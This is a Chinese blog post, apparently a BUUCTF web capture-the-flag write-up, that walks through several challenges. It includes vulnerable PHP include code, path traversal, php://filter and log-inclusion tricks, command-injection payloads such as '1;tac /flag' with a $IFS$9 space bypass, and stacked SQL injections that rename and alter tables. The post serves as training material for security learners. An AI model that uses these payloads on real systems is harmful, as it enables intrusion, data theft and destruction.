<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>BUUCTF Web Writeup 1-2 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="BUUCTF Web Writeup 1-2 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://example.com/2023/04/08/BUUCTF1-2/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-04-08T15:46:42.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/In-Challenge/">In Challenge</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>April</span>
            <span>8,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">BUUCTF Web Writeup 1-2</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665498446110-adcde124-88d1-41fc-824d-16d11330d24d.png#averageHue=%23f7ecca&clientId=ud05aa558-05a8-4&from=paste&height=519&id=u90c82c3a&name=image.png&originHeight=649&originWidth=949&originalType=binary&ratio=1&rotation=0&showTitle=false&size=217323&status=done&style=none&taskId=ua153f44b-5f1e-44c1-a5e4-c467593546c&title=&width=759.2" alt="image.png"><br>一张p脸，访问源代码显示访问source.php:<br>有了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">      <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">        <span class="variable">$page</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">      );</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">      <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">        <span class="variable">$_page</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">      );</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">   ) &#123;</span><br><span class="line">  <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码应该很好懂吧</p>
<ul>
<li>mb_substr:截取字符串，和substr一样</li>
<li>mb_strpos:查找字符第一次出现的位置</li>
</ul>
<p>审计发现，必须要让checkfile返回true才可以读取文件，要让他返回true也就是让截取的字符在白名单内，白名单有<code>hint.php</code>和<code>source.php</code><br>假如payload中没有问号，那就是默认全部截取，那必不可能返回true，所以要在前面加问号</p>
<p>还有个hint.php:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665503491382-603bbb4d-0850-4ba8-875f-32c493c0d666.png#averageHue=%23decb9e&clientId=ud05aa558-05a8-4&from=paste&height=88&id=u0d2fa62e&name=image.png&originHeight=110&originWidth=1108&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17207&status=done&style=none&taskId=ub492193e-7609-4039-b97d-809d86bc9c5&title=&width=886.4" alt="image.png"></p>
<p>payload：<code>hint.php?../../../../../ffffllllaaaagggg</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665503519467-e3391a8c-258c-4fc6-8fbe-a1164da0a240.png#averageHue=%23f6f2f1&clientId=ud05aa558-05a8-4&from=paste&height=96&id=u902ef39a&name=image.png&originHeight=120&originWidth=761&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13581&status=done&style=none&taskId=u66e41e3a-0f29-448e-8b48-720216c87a7&title=&width=608.8" alt="image.png"></p>
<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665504029703-06f543b2-9ff8-4d4d-831d-5f396347b9d4.png#averageHue=%23e0d5aa&clientId=u702eb471-5f95-4&from=paste&height=102&id=u44502c0e&name=image.png&originHeight=128&originWidth=1162&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23647&status=done&style=none&taskId=uc7128404-45d4-4208-9ac1-0a35031a7bf&title=&width=929.6" alt="image.png"><br>这边肯定是文件包含了flag.php文件，考点肯定是文件包含，试了一下发现input和data伪协议被ban了，只剩下filter，<br>直接filter读：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665504110051-897797be-f92a-41f6-b8a3-2c50f97d461e.png#averageHue=%23cacaca&clientId=u702eb471-5f95-4&from=paste&height=458&id=u71b142aa&name=image.png&originHeight=573&originWidth=1552&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43147&status=done&style=none&taskId=u2e7d61dd-488b-45e4-8e07-b0c8e4993e6&title=&width=1241.6" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665504117705-a1458550-b027-40b0-8406-e0af132c706c.png#averageHue=%23fbfafa&clientId=u702eb471-5f95-4&from=paste&height=377&id=u81261e64&name=image.png&originHeight=471&originWidth=1263&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63484&status=done&style=none&taskId=ud51d17e9-4b56-4073-b84d-aeb98705f2e&title=&width=1010.4" alt="image.png"><br>或者包含日志文件，然后蚁剑连接：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665504153715-6af007b6-8bff-4642-a495-ca8646cc30ae.png#averageHue=%23f3f2f2&clientId=u702eb471-5f95-4&from=paste&height=190&id=u5e9d7de6&name=image.png&originHeight=238&originWidth=676&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14808&status=done&style=none&taskId=ue3d676ce-313c-45a2-8104-9ed17e90800&title=&width=540.8" alt="image.png"></p>
<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>真的是送分题<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665504226507-3b2f6832-4d85-4afc-9cb0-a7da4ffb35f3.png#averageHue=%23f8f7f4&clientId=u702eb471-5f95-4&from=paste&height=219&id=u4f216a44&name=image.png&originHeight=274&originWidth=1085&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41985&status=done&style=none&taskId=uc278b257-495f-4c5a-bedf-2d5d6f885ef&title=&width=868" alt="image.png"><br>直接payload:<br><code>1;ls /</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665504239238-82510dc4-8461-4d2a-bcdf-094f08cab5ad.png#averageHue=%23f7f6f4&clientId=u702eb471-5f95-4&from=paste&height=478&id=u5f141bea&name=image.png&originHeight=597&originWidth=648&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62442&status=done&style=none&taskId=ufbf3c75a-6c2b-44c5-a0e6-9d5bd45ae84&title=&width=518.4" alt="image.png"><br>再<code>1;tac /flag</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665504249532-e3a3c9e8-4b4e-4f08-950c-b872332dbd87.png#averageHue=%23f7f6f5&clientId=u702eb471-5f95-4&from=paste&height=95&id=u37e41e73&name=image.png&originHeight=119&originWidth=660&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7555&status=done&style=none&taskId=u9ee1c417-19e2-4e0d-881c-89c392e9e69&title=&width=528" alt="image.png"></p>
<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665504290314-5c0b20b3-b025-4d29-8bf5-236fad0459b5.png#averageHue=%231a1a1a&clientId=u702eb471-5f95-4&from=paste&id=ucbc348a2&name=image.png&originHeight=574&originWidth=1132&originalType=url&ratio=1&rotation=0&showTitle=false&size=388467&status=done&style=none&taskId=u1f68081f-d361-4a80-b8c2-3553f3360ab&title=" alt="image.png"><br>一个登入界面，随便输入一串数字：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665504291804-4533c6c6-ca49-46f9-b58a-04b826ea038b.png#averageHue=%23190909&clientId=u702eb471-5f95-4&from=paste&id=u8dc90901&name=image.png&originHeight=538&originWidth=1431&originalType=url&ratio=1&rotation=0&showTitle=false&size=280077&status=done&style=none&taskId=u530f7a83-9758-4c44-b87f-41a2a7469e7&title=" alt="image.png"><br>在这个页面可以看到存在一些URL参数，这里应该就是sql注入点了<br>解题<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665504291043-45edf048-3a71-40b9-a334-fc33e4bccc10.png#averageHue=%23141414&clientId=u702eb471-5f95-4&from=paste&id=u169485a7&name=image.png&originHeight=542&originWidth=1668&originalType=url&ratio=1&rotation=0&showTitle=false&size=249711&status=done&style=none&taskId=ud0728da6-6dd1-4a64-b9d4-4da8d50b439&title=" alt="image.png"><br>传入单引号发现有报错，那肯定就是sql注入了，这边经过测试发现查询语句应该是<br> <code>select flag from xxx where username=&#39;&#39;and password=&#39;&#39;   </code><br>解法一：（万能密码）<br>用一下万能密码就可以成功登入了，payload：<br>?username&#x3D;admin’ or 1&#x3D;’1&amp;password&#x3D;admin’ or 1&#x3D;’1<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665504291745-fd6ce8a6-6900-4c64-8625-45e66546d17c.png#averageHue=%231b1a1a&clientId=u702eb471-5f95-4&from=paste&id=ub4758b4d&name=image.png&originHeight=408&originWidth=1632&originalType=url&ratio=1&rotation=0&showTitle=false&size=167994&status=done&style=none&taskId=u8cd2b98c-42ac-4847-abfc-eceebaa8ed7&title=" alt="image.png"><br>解法二：（转义）<br>转义单引号，在usernmae一栏输入\，然后就会形成：<br> username&#x3D;’and password&#x3D;<br>这种情况，之后在password输入or 1&#x3D;’1<br><code>payload:?username=\&amp;password=or 1=&#39;1</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665504291759-713b5a80-573e-448b-9770-cacbcaf1b07d.png#averageHue=%23141212&clientId=u702eb471-5f95-4&from=paste&id=u7aabed91&name=image.png&originHeight=564&originWidth=1598&originalType=url&ratio=1&rotation=0&showTitle=false&size=237990&status=done&style=none&taskId=u22250245-e0a3-4747-bdcb-8a3faf30b48&title=" alt="image.png"></p>
<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665504361201-5b5a3fbc-bb01-4c46-aa43-8d09b77e54de.png#averageHue=%23f2f1f1&clientId=u702eb471-5f95-4&from=paste&height=234&id=ub67358b4&name=image.png&originHeight=293&originWidth=1433&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38056&status=done&style=none&taskId=ue4d80626-8fb0-45dd-8e76-1dc3398f617&title=&width=1146.4" alt="image.png"><br>经过测试发现为堆叠注入,输入<code>1;show tables#</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665504427127-fbe938c3-9235-4368-ac4c-ba2b416546f8.png#averageHue=%23f6f5f3&clientId=u702eb471-5f95-4&from=paste&height=114&id=uae486a76&name=image.png&originHeight=142&originWidth=337&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6603&status=done&style=none&taskId=ua6c7c8e7-dc72-400e-8f38-57434c98592&title=&width=269.6" alt="image.png"><br>本来以为是这个，再换一个payload你会发现，<code>2;show tables;#</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665504456040-69c8f7a3-dec1-4d2f-ae21-382adc158b50.png#averageHue=%23efeae1&clientId=u702eb471-5f95-4&from=paste&height=133&id=u7b12f7e8&name=image.png&originHeight=166&originWidth=532&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31100&status=done&style=none&taskId=u0ab5fe6a-3420-4851-b176-e6c95232a82&title=&width=425.6" alt="image.png"><br>到这里我才发现自己貌似搞错了，应该是1,2都对应了参数，所以把有回显的2行全占用了，改payload为<code>&#39;;show tables#</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665504497458-7fa483ef-cc3f-442d-aa62-31ba487393bf.png#averageHue=%23f4f3f0&clientId=u702eb471-5f95-4&from=paste&height=197&id=ua706a1c2&name=image.png&originHeight=246&originWidth=445&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19554&status=done&style=none&taskId=u0fcd77e1-2d09-4f08-8a8d-49a85a565c7&title=&width=356" alt="image.png"><br>这应该才是真正的表，这边可以继续payload<code>&#39;;show columns from </code>1919810931114514<code>#</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665504547310-2a8b6f6b-1734-4cbd-87dc-dd1f9c6f4f9f.png#averageHue=%23f3f1ed&clientId=u702eb471-5f95-4&from=paste&height=277&id=u0e26d1b5&name=image.png&originHeight=346&originWidth=471&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32971&status=done&style=none&taskId=u59bef4c8-afb1-4b13-81c9-28e02c5bac0&title=&width=376.8" alt="image.png"><br>可以看见flag，继续<code>&#39;;select flag from </code>1919810931114514<code>#</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665504585557-ecebace6-3f64-41f0-9ea5-103ba84b7e5e.png#averageHue=%23f8f8f8&clientId=u702eb471-5f95-4&from=paste&height=87&id=ue1abb494&name=image.png&originHeight=109&originWidth=722&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4827&status=done&style=none&taskId=ue4708e0e-e3ed-4c53-9442-770fbd15d54&title=&width=577.6" alt="image.png"><br>发现过滤了select，这边就可以分化出2种解法了</p>
<p><strong>解法一</strong>:<br>使用预处理指令：<br><code>&#39;;PREPARE boogipop from concat(&#39;se&#39;,&#39;lect flag from </code>1919810931114514<code>&#39;);EXECUTE boogipop#</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665504843117-95870ca2-5e94-4c38-8f44-39eaf5aa2ed5.png#averageHue=%23f8f7f6&clientId=u702eb471-5f95-4&from=paste&height=160&id=u38707c32&name=image.png&originHeight=200&originWidth=796&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18467&status=done&style=none&taskId=ua9dcf255-ac9e-42b5-96ed-1620150fb88&title=&width=636.8" alt="image.png"></p>
<p><strong>解法二：</strong><br>没有ban掉alter和rename，可以试试<br><code>&#39;; rename table words to word1; rename table </code>1919810931114514<code> to words;alter table words add id int unsigned not Null auto_increment primary key;</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665506703383-fa38eb38-17aa-4a52-b7ef-31c454c9c881.png#averageHue=%23f6f4f2&clientId=u702eb471-5f95-4&from=paste&height=151&id=u4eddeae3&name=image.png&originHeight=189&originWidth=663&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18079&status=done&style=none&taskId=u9141a394-2cea-49c1-80c2-b0ddb76648b&title=&width=530.4" alt="image.png"><br>PRIMAPY是<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E4%B8%BB%E9%94%AE&spm=1001.2101.3001.7020">主键</a>的意思，表示定义的该列值在表中是唯一的意思，不可以有重复。、<br>这边primary key必不可少<br><strong>解法三：</strong><br>可以用handler指令：<br><code>&#39;;handler </code>1919810931114514<code> open as a;handler a read FIRST;#</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665507209600-8e710a0a-9371-42e1-b7c9-b45a84568c8e.png#averageHue=%23f6f5f3&clientId=u702eb471-5f95-4&from=paste&height=154&id=uea1f47cc&name=image.png&originHeight=193&originWidth=661&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18987&status=done&style=none&taskId=u5e12d9c5-3b5f-497f-9ea2-441e3bf3243&title=&width=528.8" alt="image.png"></p>
<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>这题有点花，来分析一下：输入1返回1<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665507264298-6ea05b84-01a2-4e3f-9d28-017adc4170d6.png#averageHue=%23f9f8f5&clientId=u702eb471-5f95-4&from=paste&height=166&id=udf17e0ab&name=image.png&originHeight=207&originWidth=834&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24051&status=done&style=none&taskId=u8da850be-5256-4b99-b0d3-732af0a4a60&title=&width=667.2" alt="image.png"><br>输入2返回1：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665507277778-b37e49c8-a5b1-4f02-9338-68647466c8dd.png#averageHue=%23f8f7f6&clientId=u702eb471-5f95-4&from=paste&height=118&id=u7fee74f1&name=image.png&originHeight=148&originWidth=439&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6602&status=done&style=none&taskId=u1e29be9f-df09-4b27-a87d-d21768e4745&title=&width=351.2" alt="image.png"><br>输入0什么都不返回：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665507293192-68a04314-b8d5-4ae6-8932-dbd3d28d9092.png#averageHue=%23f6f4f2&clientId=u702eb471-5f95-4&from=paste&height=94&id=u32dcd112&name=image.png&originHeight=118&originWidth=509&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10209&status=done&style=none&taskId=ueee6012b-09a5-47ce-a433-d80fd7bd58d&title=&width=407.2" alt="image.png"><br>输入<code>1;show tables#</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665507381708-21c42fbb-d5a8-4dd2-a4f5-b0cabff55888.png#averageHue=%23f7f5f4&clientId=u702eb471-5f95-4&from=paste&height=92&id=ubbd75377&name=image.png&originHeight=115&originWidth=690&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8362&status=done&style=none&taskId=u7cdb5cea-98c4-437e-952c-63b75d382f8&title=&width=552" alt="image.png"><br>由此可以判断查询语句应该是<code>SELECT $_POST[query]||flag from Flag</code><br>这边直接输入<code>&#39;;show columns from Flag#</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665507709879-0765e86c-4b22-40fd-b298-9ff308892405.png#averageHue=%23f9f8f7&clientId=u702eb471-5f95-4&from=paste&height=103&id=u5cc19baa&name=image.png&originHeight=129&originWidth=730&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9866&status=done&style=none&taskId=u3972bed8-09f8-4c7e-a41b-4c4d43ac1fc&title=&width=584" alt="image.png"><br>结果测试发现是过滤了Flag</p>
<p>所以我们直接payload<code>*,1</code>，这样查询语法就变成了<code>SELECT *,1 from Flag</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665507411426-74fd7c8c-77ac-4ff6-8ccd-27372fa68715.png#averageHue=%23f8f6f5&clientId=u702eb471-5f95-4&from=paste&height=123&id=u6b38925d&name=image.png&originHeight=154&originWidth=913&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19665&status=done&style=none&taskId=uf710f1ff-f36c-488a-a683-d21b5b5c914&title=&width=730.4" alt="image.png"></p>
<p><strong>解法二：</strong><br>使用set sql_mode&#x3D;pipes_as_concat来绕过，这个mysql常量可以让<code>||</code>变为<code>concat</code>函数<br>payload：<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665507943617-2bff1335-98f4-461c-88f6-e8fccec5acae.png#averageHue=%23f8f7f6&clientId=u702eb471-5f95-4&from=paste&height=114&id=ua3ec9885&name=image.png&originHeight=143&originWidth=1074&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16410&status=done&style=none&taskId=ufbb4afb3-2740-4e0f-8175-264eb2cf15a&title=&width=859.2" alt="image.png"><br>这边我们的payload长一个字符都不行，否则会出现toolong提示，所以这个方法没几个人想得到吧。。。</p>
<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665507994888-8af28af9-fce5-4638-886c-1ea12961f37b.png#averageHue=%23d1c6a6&clientId=u702eb471-5f95-4&from=paste&height=90&id=ufe6db27f&name=image.png&originHeight=113&originWidth=817&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9139&status=done&style=none&taskId=u34ac4476-ce59-4c8c-9d1a-90e6d4d0aab&title=&width=653.6" alt="image.png"><br>肯定是传参ip，和上面有道题很相似：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665508012760-7a73e222-2a81-4bf0-bc48-11ae8c14b111.png#averageHue=%23e6cfb1&clientId=u702eb471-5f95-4&from=paste&height=140&id=u68f9b7cb&name=image.png&originHeight=175&originWidth=922&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10298&status=done&style=none&taskId=uf59ea9f1-ee45-43e6-9bf1-5f67b52e26d&title=&width=737.6" alt="image.png"><br>发现可以看到flag文件，然后试试读取：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665508031992-acc80707-47e7-4d69-a3d6-76f320ef828d.png#averageHue=%23dbcea3&clientId=u702eb471-5f95-4&from=paste&height=102&id=u66dc4b04&name=image.png&originHeight=127&originWidth=1089&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17352&status=done&style=none&taskId=u4a33039e-1f12-4563-8d66-52f2d24306c&title=&width=871.2" alt="image.png"><br>ban掉了空格，经过测试使用<code>$IFS$9</code>绕过：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665508068454-0e6d7b43-9d88-4088-b5dc-562b6e309521.png#averageHue=%23d8caa0&clientId=u702eb471-5f95-4&from=paste&height=132&id=u570e00c5&name=image.png&originHeight=165&originWidth=1170&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21376&status=done&style=none&taskId=udf01a51c-915c-4304-986a-1fd45c39f98&title=&width=936" alt="image.png"><br>ban掉了什么很好奇我们直接把index.php读出来：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665508093769-7dc28fe0-e626-4287-bfe5-e143fd7a7983.png#averageHue=%23f8f8f7&clientId=u702eb471-5f95-4&from=paste&height=373&id=u86faf581&name=image.png&originHeight=466&originWidth=1212&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53635&status=done&style=none&taskId=ua0d0ad63-79bf-4b8b-a987-c7bdfa33105&title=&width=969.6" 